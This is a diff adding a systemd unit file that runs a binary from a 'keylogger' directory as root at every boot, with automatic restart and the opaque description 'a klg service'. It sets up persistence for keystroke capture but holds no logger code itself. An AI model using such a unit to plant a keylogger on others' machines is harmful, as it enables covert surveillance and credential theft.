@@ -1,0 +1,22 @@
+[Unit]
+Description=a klg service
+After=network-online.target
+ 
+[Service]
+Type=forking
+PIDFile=/run/klg.pid
+
+User=root
+Group=root
+UMask=007
+ 
+ExecStart=/home/user42/Bureau/keylogger/keylogger
+ 
+Restart=on-failure
+ 
+# Configures the time to wait before service is stopped forcefully.
+# TimeoutStopSec=30
+ 
+[Install]
+WantedBy=multi-user.target
+Alias=klg
